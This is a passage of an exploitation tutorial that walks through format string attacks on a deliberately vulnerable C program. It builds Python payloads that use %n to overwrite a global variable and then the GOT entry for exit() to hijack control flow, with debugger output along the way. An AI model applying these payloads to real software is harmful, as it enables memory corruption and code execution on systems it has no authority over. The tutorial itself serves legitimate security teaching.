<p>As we've compiled the binary with the <code>-no-pie</code> parameter, we instructed the compiler to disable PIE (Position Independent Executable) protection. This ensures that every symbol within the binary will load at the same location in memory during each execution. So, when finding the address of that global variable, it will remain consistent across each execution.</p><br/>
<p>To identify the address of the variable, we can use <code>objdump</code> to print all symbols in the binary file:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">t</span> <span class="n">vulnerable</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">target</span>
<span class="mi">0804</span><span class="n">c028</span> <span class="n">g</span>     <span class="n">O</span> <span class="o">.</span><span class="n">bss</span>    <span class="mi">00000004</span>              <span class="n">target</span>
</pre></div>
<p>As observed, the variable <code>target</code> will load at address <code>0804c028</code> during each execution.</p><br/>
<p>Now, let's replace the string <code>AAAA</code> in our payload with the address <code>0804c028</code>. Remember, we need to format it in little endian, so the address <code>0804c028</code> becomes <code>\x28\xc0\x04\x08</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">vulnerable</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys; sys.stdout.buffer.write(b"</span><span class="se">\x28\xc0\x04\x08</span><span class="s1">" + b"</span><span class="si">%x</span><span class="s1"> "*15 + b"%6$x")'</span><span class="p">)</span>
<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">You</span> <span class="n">have</span> <span class="n">entered</span> <span class="n">the</span> <span class="n">following</span> <span class="n">string</span><span class="p">:</span> <span class="p">(</span><span class="mi">64</span> <span class="n">f7626620</span> <span class="mi">80491</span><span class="n">ad</span> <span class="mi">0</span> <span class="mi">1</span> <span class="mi">804</span><span class="n">c028</span> <span class="mi">25207825</span> <span class="mi">78252078</span> <span class="mi">20782520</span> <span class="mi">25207825</span> <span class="mi">78252078</span> <span class="mi">20782520</span> <span class="mi">25207825</span> <span class="mi">78252078</span> <span class="mi">20782520</span> <span class="mi">804</span><span class="n">c028</span>

<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">The</span> <span class="n">target</span> <span class="n">variable</span> <span class="n">wasn</span><span class="s1">'t modified.</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>As you can see, it is now printing the address of the variable <code>target</code>. If we replace <code>%6$x</code> with <code>%6$n</code>, the challenge should be solved.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">vulnerable</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys; sys.stdout.buffer.write(b"</span><span class="se">\x28\xc0\x04\x08</span><span class="s1">" + b"</span><span class="si">%x</span><span class="s1"> "*15 + b"%6$n")'</span><span class="p">)</span>
<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">You</span> <span class="n">have</span> <span class="n">entered</span> <span class="n">the</span> <span class="n">following</span> <span class="n">string</span><span class="p">:</span> <span class="p">(</span><span class="mi">64</span> <span class="n">eee26620</span> <span class="mi">80491</span><span class="n">ad</span> <span class="mi">0</span> <span class="mi">1</span> <span class="mi">804</span><span class="n">c028</span> <span class="mi">25207825</span> <span class="mi">78252078</span> <span class="mi">20782520</span> <span class="mi">25207825</span> <span class="mi">78252078</span> <span class="mi">20782520</span> <span class="mi">25207825</span> <span class="mi">78252078</span> <span class="mi">20782520</span> 

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Congratulations</span><span class="p">,</span> <span class="n">you</span><span class="s1">'ve successfully modified the target variable.</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>It worked! We successfully achieved memory overwriting through the Format String Vulnerability and were able to overwrite the value of the variable <code>target</code>, thereby solving the challenge. </p><br/>
<br/><h2>GOT Overwrite</h2><br/>
<p>As we've seen in the previous example, through abusing a Format String Vulnerability, we can achieve memory overwriting. One interesting target for such overwriting is the Global Offset Table (GOT). I have already written <a href="https://elswix.github.io/articles/6/PLT-and-GOT.html">an article</a> where I discuss the GOT and PLT and their significant roles in Dynamic Linking, so I recommend reading it before continuing.</p><br/>
<p>To simplify, the Global Offset Table (GOT) is a data structure in programs that use dynamic linking, such as those in Unix-based systems. It stores addresses of variables and functions from shared libraries. During program execution, the dynamic linker populates these addresses, enabling programs to locate and utilize functions and variables dynamically.</p><br/>
<p>Think of the GOT as the table below:</p><br/>
<p><img alt="" src="https://elswix.github.io/articles/6/img/1.png"/></p><br/>
<p>As you can see, each entry (function name) is mapped to its corresponding address in libc at runtime. For example, <code>puts()</code> is located at address <code>0xf7c72880</code> in this illustration. This table allows programs to quickly access function addresses once it is populated, without needing to invoke the dynamic linker every time a function's address is required. So, when the program needs to call <code>exit()</code>, it simply retrieves the address from the GOT.</p><br/>
<p>Once the dynamic linker fills in the address of a function, the GOT retains that address for the entire duration of the program's execution, until it closes. Therefore, if this address is overwritten, the program will inadvertently call the new address instead of the intended function. To illustrate, consider if we manage to overwrite the GOT entry for <code>exit()</code> with the address of another function. Subsequently, when the program attempts to call <code>exit()</code>, it will actually jump to the overwritten address.</p><br/>
<p><br/></p><br/>
<br/><h3 class="note">Note</h3><br/>
<p>To grasp this concept better, I highly recommend reading <a href="https://elswix.github.io/articles/6/PLT-and-GOT.html">my article</a> where I explain these concepts in a clearer and more detailed manner.</p><br/>
<p><br/></p><br/>
<br/><h2>Practice</h2><br/>
<p>To carry out this exploitation, we'll use the following program:</p><br/>
<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">void</span><span class="w"> </span><span class="nf">target</span><span class="p">(){</span><span class="w"></span>

<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">"Congratulations, you've successfully solved this challenge!"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>

<span class="p">}</span><span class="w"></span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(){</span><span class="w"></span>

<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">userinput</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span><span class="w"> </span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"Please, enter a string: "</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">fgets</span><span class="p">(</span><span class="n">userinput</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">userinput</span><span class="p">),</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span><span class="w"> </span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"You've entered the following string: "</span><span class="p">);</span><span class="w"> </span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="n">userinput</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"> </span>
<span class="p">}</span><span class="w"></span>
</pre></div>
<p>Let's analyze this program. The goal of this challenge is to call the <code>target</code> function. As observed in the <code>main</code> function, there's a format string vulnerability. This occurs because the variable used to store user input is directly passed as the format parameter (first parameter) to <code>printf()</code>.</p><br/>
<p>Let's compile the program using <code>gcc</code> with the <code>-no-pie</code> and <code>-m32</code> parameters (ignore the warnings):</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">gcc</span> <span class="n">program</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">program</span> <span class="o">-</span><span class="n">m32</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">pie</span>
<span class="n">program</span><span class="o">.</span><span class="n">c</span><span class="p">:</span> <span class="n">In</span> <span class="n">function</span> <span class="err">‘</span><span class="n">main</span><span class="err">’</span><span class="p">:</span>
<span class="n">program</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span> <span class="n">warning</span><span class="p">:</span> <span class="nb">format</span> <span class="ow">not</span> <span class="n">a</span> <span class="n">string</span> <span class="n">literal</span> <span class="ow">and</span> <span class="n">no</span> <span class="nb">format</span> <span class="n">arguments</span> <span class="p">[</span><span class="o">-</span><span class="n">Wformat</span><span class="o">-</span><span class="n">security</span><span class="p">]</span>
   <span class="mi">21</span> <span class="o">|</span>         <span class="n">printf</span><span class="p">(</span><span class="n">userinput</span><span class="p">);</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<h3>Strategy</h3><br/>
<p>So far, we understand that a format string vulnerability can be triggered because our input is passed as the first parameter to <code>printf()</code>. After that, the program calls the <code>exit()</code> function, which instructs the kernel to terminate the process. We can exploit this by overwriting the Global Offset Table (GOT) entry for <code>exit()</code>, thereby redirecting the program flow to another unintended function.</p><br/>
<p>We can obtain the address of the <code>exit()</code> function's GOT entry using tools like <code>objdump</code>. This address is what we place on the stack to later retrieve and use as the parameter for <code>printf</code> when using <code>%n</code>. This process mirrors what we did when overwriting the value of a global variable. We input the address (thus placing it on the stack), then locate its position on the stack using the format string vulnerability. Once its position is determined, we can use it as a pointer to store the length of characters printed with the <code>%n</code> format specifier, effectively overwriting the value pointed to by this address.</p><br/>
<p>In this case, the length of characters printed should represent the exact address of the target function. For example, if the target function is located at address <code>0x12345678</code>, we would need to print <code>305419896</code> characters (which corresponds to <code>0x12345678</code> in hexadecimal) before using the <code>%n</code> format specifier. This allows us to overwrite the value stored at the specified pointer with the exact address of the target function. But how do we achieve this if the program only allows us to enter a maximum of <code>100</code> bytes?</p><br/>
<br/><h2>Exploitation</h2><br/>
<p>To achieve this, we first need to obtain the address of the GOT entry for <code>exit</code>. To do so, we can use <code>objdump</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">D</span> <span class="n">program</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">'&lt;exit@plt&gt;'</span> <span class="o">-</span><span class="n">A</span> <span class="mi">2</span>
<span class="mi">08049090</span> <span class="o">&lt;</span><span class="n">exit</span><span class="n">@plt</span><span class="o">&gt;</span><span class="p">:</span>
 <span class="mi">8049090</span><span class="p">:</span>    <span class="n">ff</span> <span class="mi">25</span> <span class="mi">20</span> <span class="n">c0</span> <span class="mi">04</span> <span class="mi">08</span>     <span class="n">jmp</span>    <span class="o">*</span><span class="mh">0x804c020</span>
 <span class="mi">8049096</span><span class="p">:</span>    <span class="mi">68</span> <span class="mi">28</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>        <span class="n">push</span>   <span class="n">$</span><span class="mh">0x28</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>As observed, the PLT entry of <code>exit()</code> contains a <code>jmp</code> instruction to an address pointed to by <code>0x804c020</code>, which is the GOT entry of the <code>exit()</code> function.</p><br/>
<p>Let's create a Python exploit for this scenario. We'll store the address of the GOT entry of <code>exit()</code>. Instead of directly entering the address as input and searching for it on the stack, it's easier to use a more recognizable string like <code>AAAA</code>, which corresponds to <code>41414141</code> in hexadecimal. Afterwards, we can simply replace these <code>AAAA</code> characters with the address, ensuring it remains in the correct location.</p><br/>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span> 

<span class="n">exit_got</span> <span class="o">=</span> <span class="mh">0x804c020</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"AAAA"</span> 
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"BBBB"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"CCCC"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="si">%x</span><span class="s2"> "</span><span class="o">*</span><span class="mi">15</span>

<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</pre></div>
<p>In this exploit, we define three string patterns, allowing us to reserve additional positions on the stack if needed.</p><br/>
<p>Let's execute the program and pass the exploit output as standard input (stdin):</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span><span class="p">)</span>
<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">You</span><span class="s1">'ve entered the following string: AAAABBBBCCCC64 eec26620 80491fb 0 1 41414141 42424242 43434343 25207825 78252078 20782520 25207825 78252078 20782520 25207825 </span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>As you can see, the addresses are correctly aligned and consecutive. To determine their positions on the stack, we can use the same trick as before.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s1">'AAAABBBBCCCC64 eec26620 80491fb 0 1 41414141 42424242 43434343 25207825 78252078 20782520 25207825 78252078 20782520 25207825 '</span> <span class="o">|</span> <span class="n">tr</span> <span class="s1">' '</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">E</span> <span class="s2">"41414141|42424242|43434343"</span> <span class="o">-</span><span class="n">n</span>
<span class="mi">6</span><span class="p">:</span><span class="mi">41414141</span>
<span class="mi">7</span><span class="p">:</span><span class="mi">42424242</span>
<span class="mi">8</span><span class="p">:</span><span class="mi">43434343</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Perfect, they're at positions 6, 7, and 8. To confirm that those positions are correct, we can add the following lines to our Python exploit:</p><br/>
<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"%6$x "</span> <span class="c1"># position 6 "AAAA"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"%7$x "</span> <span class="c1"># position 7 "BBBB"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"%8$x "</span> <span class="c1"># position 8 "CCCC"</span>
</pre></div>
<p>This payload will instruct <code>printf()</code> to print the values at "parameters" 6, 7, and 8, which, as we've observed, correspond to the strings <code>AAAA</code>, <code>BBBB</code>, and <code>CCCC</code>, respectively.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span><span class="p">)</span>
<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">You</span><span class="s1">'ve entered the following string: AAAABBBBCCCC64 f5c26620 80491fb 0 1 41414141 42424242 43434343 25207825 78252078 20782520 25207825 78252078 20782520 25207825 41414141 42424242 43434343 </span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Great! Those values were correct. Now we can simply replace those strings with the desired address where we want to overwrite values, in this case, the GOT entry of <code>exit()</code>. I'll replace the <code>AAAA</code> characters with the address in little endian:</p><br/>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span> 

<span class="n">exit_got</span> <span class="o">=</span> <span class="mh">0x804c020</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">exit_got</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">"little"</span><span class="p">)</span> <span class="c1"># Convert to little-endian</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"BBBB"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"CCCC"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="si">%x</span><span class="s2"> "</span><span class="o">*</span><span class="mi">15</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"%6$x "</span> <span class="c1"># position 6 exit@got address</span>

<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</pre></div>
<p>As observed, we're using the <code>to_bytes()</code> method to convert the <code>exit_got</code> address to little-endian. We should see the address of the GOT entry at the end of the program's output when passing this payload.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span><span class="p">)</span>
<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">You</span><span class="s1">'ve entered the following string:  BBBBCCCC64 ea626620 80491fb 0 1 804c020 42424242 43434343 25207825 78252078 20782520 25207825 78252078 20782520 25207825 804c020 </span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Perfect! It works correctly. Now, if we replace <code>%6%x</code> with <code>%6%n</code>, the GOT entry of <code>exit()</code> should be overwritten. When the program subsequently calls the function, it will crash. </p><br/>
<p>To gain a better understanding of the program's behavior, let's use the <strong>GNU Debugger (GDB)</strong> to conduct a thorough examination.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="n">program</span>
<span class="n">GEF</span> <span class="k">for</span> <span class="n">linux</span> <span class="n">ready</span><span class="p">,</span> <span class="nb">type</span> <span class="n">`</span><span class="n">gef</span><span class="s1">' to start, `gef config'</span> <span class="n">to</span> <span class="n">configure</span>
<span class="mi">88</span> <span class="n">commands</span> <span class="n">loaded</span> <span class="ow">and</span> <span class="mi">5</span> <span class="n">functions</span> <span class="n">added</span> <span class="k">for</span> <span class="n">GDB</span> <span class="mf">12.1</span> <span class="ow">in</span> <span class="mf">0.00</span><span class="n">ms</span> <span class="n">using</span> <span class="n">Python</span> <span class="n">engine</span> <span class="mf">3.10</span>
<span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="nn">program...</span>
<span class="p">(</span><span class="n">No</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">program</span><span class="p">)</span>
<span class="nd">gef$</span>
</pre></div>
<p>I'll disable the <code>context</code> display in GEF, as it can be distracting when simply testing program flow.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">gef</span> <span class="n">config</span> <span class="n">context</span><span class="o">.</span><span class="n">enable</span> <span class="n">false</span>
</pre></div>
<p>Let's execute the program and provide the exploit output as input:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">run</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span><span class="p">)</span>
<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Local</span><span class="o">/</span><span class="n">formatstring</span><span class="o">-</span><span class="n">article</span><span class="o">/</span><span class="n">gotoverwrite</span><span class="o">/</span><span class="n">program</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span><span class="p">)</span>
<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="o">.</span>
<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">You</span><span class="s1">'ve entered the following string:  BBBBCCCC64 f7e26620 80491fb 0 1 804c020 42424242 43434343 25207825 78252078 20782520 25207825 78252078 20782520 25207825 804c020 </span>
<span class="p">[</span><span class="n">Inferior</span> <span class="mi">1</span> <span class="p">(</span><span class="n">process</span> <span class="mi">31191</span><span class="p">)</span> <span class="n">exited</span> <span class="k">with</span> <span class="n">code</span> <span class="mi">01</span><span class="p">]</span>
<span class="nd">gef$</span>
</pre></div>
<p>Nice, it works as expected. Let's replace <code>%6$x</code> with <code>%6$n</code>, which should overwrite the GOT entry of <code>exit()</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"%6$n "</span> <span class="c1"># position 6 exit@got address</span>
</pre></div>
<p>Let's execute the program again:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">run</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span><span class="p">)</span>
<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Local</span><span class="o">/</span><span class="n">formatstring</span><span class="o">-</span><span class="n">article</span><span class="o">/</span><span class="n">gotoverwrite</span><span class="o">/</span><span class="n">program</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span><span class="p">)</span>
<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="o">.</span>
<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">You</span><span class="s1">'ve entered the following string:  BBBBCCCC64 f7e26620 80491fb 0 1 804c020 42424242 43434343 25207825 78252078 20782520 25207825 78252078 20782520 25207825  </span>

<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
<span class="mh">0x0000007d</span> <span class="ow">in</span> <span class="n">??</span> <span class="p">()</span>
<span class="nd">gef$</span>
</pre></div>
<p>Great! It crashed. It attempted to access the memory address <code>0x0000007d</code>, which, of course, is an invalid address. Let's examine the GOT entry:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">x</span> <span class="mh">0x804c020</span>
<span class="mh">0x804c020</span> <span class="o">&lt;</span><span class="n">exit</span><span class="n">@got</span><span class="o">.</span><span class="n">plt</span><span class="o">&gt;</span><span class="p">:</span>   <span class="mh">0x0000007d</span>
<span class="nd">gef$</span>
</pre></div>
<p>As observed, it has been successfully overwritten. Consequently, when the program attempted to access the <code>exit()</code> function, it was redirected to the overwritten address <code>0x0000007d</code>.</p><br/>
<p>Now, let's find the address of the target function:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">x</span> <span class="n">target</span>
<span class="mh">0x80491b6</span> <span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="p">:</span>   <span class="mh">0x53e58955</span>
<span class="nd">gef$</span>
</pre></div>
<p>It resides at address <code>0x80491b6</code>. Converting this value to decimal indicates that we would need to enter <code>134517174</code> characters, which is clearly impractical given the program's limit of <code>100</code> characters for input.</p><br/>
<p>However, there's a workaround using padding functionality to increase the number of characters printed. This padding allows us to insert space characters until we reach a specified length. For example, by entering <code>%6$200x</code>, we can fill up to <code>200</code> characters, including the hexadecimal value we're printing.</p><br/>
<p>In this scenario, the value at position 6 is our address <code>804c020</code>, which consists of 7 characters (ignoring the leading zeros when printed). Therefore, the format specifier <code>%6$200x</code> adds 193 space characters to achieve a total of 200 characters (accounting for the 7 characters already printed representing the address).</p><br/>
<p>So we can use <code>%6$134517174x</code> to print the exact quantity of characters that, when calculated, results in the address of the target function. However, it's crucial to subtract the number of characters already printed. For instance, without adding padding, we were redirected to address <code>0x0000007d</code>, indicating that 125 characters were printed before reaching this redirection. Therefore, we need to subtract these 125 characters from the total of 134517174 characters we aim to print. This ensures we reach the correct address and avoid overshooting it.</p><br/>
<p>Theoretically, we should add 134517049 characters to those 125 already printed to precisely reach the target function address. Hence, our format specifier would be <code>%6$134517049x</code>.</p><br/>
<p>Finally, this would be our payload:</p><br/>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span> 

<span class="n">exit_got</span> <span class="o">=</span> <span class="mh">0x804c020</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">exit_got</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">"little"</span><span class="p">)</span> <span class="c1"># Convert to little-endian</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"BBBB"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"CCCC"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="si">%x</span><span class="s2"> "</span><span class="o">*</span><span class="mi">15</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"%6$134517049x"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"%6$n"</span>

<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</pre></div>
<p>This method will indeed work, though it may take some time to print that many characters. However, there is an alternative approach to achieve the same result without needing to print such a large quantity of characters.</p><br/>
<p>We could split the overwrite into two parts. As you know, a memory address is 4 bytes long in 32-bit architecture. Instead of attempting to overwrite the entire address at once, we can overwrite the first 2 bytes and then the remaining 2 bytes separately.</p><br/>
<p>For instance, we need to overwrite the GOT entry for <code>exit()</code> with the address <code>0x80491b6</code>, so instead of writing the entire address we firstly, overwrite the first two bytes, which means we have to enter <code>0x91b6</code> characters and perform an overwrite with the <code>%n</code> format specifier.</p><br/>
<div class="highlight"><pre><span></span><span class="n">GOT</span><span class="w"> </span><span class="n">exit</span><span class="p">()</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="mh">0x000091b6</span><span class="w"></span>
</pre></div>
<p>Then, we simply need to move two bytes and proceed to overwrite the remaining two bytes with <code>0x0804</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">GOT</span><span class="w"> </span><span class="n">exit</span><span class="p">()</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="mh">0x080491b6</span><span class="w"></span>
</pre></div>
<p>To increment by two bytes, we need to use <code>exit_got + 2</code>. We can perform this operation in our script as follows:</p><br/>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span> 

<span class="n">exit_got</span> <span class="o">=</span> <span class="mh">0x804c020</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">exit_got</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">"little"</span><span class="p">)</span> <span class="c1"># Convert to little-endian</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="p">(</span><span class="n">exit_got</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">"little"</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"CCCC"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="si">%x</span><span class="s2"> "</span><span class="o">*</span><span class="mi">15</span>
